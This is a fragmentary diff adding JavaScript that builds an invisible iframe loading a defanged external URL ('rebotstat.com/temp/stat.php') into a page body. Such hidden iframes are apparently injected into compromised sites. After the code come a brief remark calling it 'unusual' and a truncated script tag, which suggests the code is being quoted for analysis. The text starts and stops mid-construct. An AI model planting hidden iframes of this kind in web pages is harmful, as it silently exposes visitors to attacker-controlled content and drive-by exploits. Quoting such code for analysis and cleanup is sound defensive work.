@@ -1,0 +1,15 @@
+){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://rebotstat.com/temp/stat.php');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cument.getElementsByTagName('body')[0].append​Child(f);
+}
+
+This code on this one is a bit unusual
+
+<sc
